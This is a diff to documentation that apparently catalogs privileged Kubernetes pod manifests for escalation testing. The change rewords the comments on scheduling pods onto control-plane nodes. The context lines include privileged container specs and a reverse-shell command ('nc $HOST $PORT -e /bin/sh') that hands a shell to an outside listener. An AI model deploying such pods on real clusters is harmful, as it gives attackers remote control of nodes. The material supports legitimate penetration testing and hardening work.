@@ -22,8 +22,7 @@ spec:
     args: [ "while true; do sleep 30; done;" ]
     securityContext:
       privileged: true
-  # Force scheduling of your pod on a control plane node by uncommenting the next line and changing the nodeName to that of a control plane node
-  #nodeName: k8s-control-plane-node
+  #nodeName: control-plane-node-name # Uncomment and change to control node name to try and schedule pod on control-plane node
   ```
 [pod-priv.yaml](pod-priv.yaml)
 
@@ -59,8 +58,7 @@ spec:
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
     securityContext:
       privileged: true
-  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
-  #nodeName: k8s-control-plane-node
+    #nodeName: control-plane-node-name # Uncomment and change to control node name to try and schedule pod on control-plane node
   restartPolicy: Always
 ```
 [pod-priv-revshell.yaml](pod-priv-revshell.yaml)
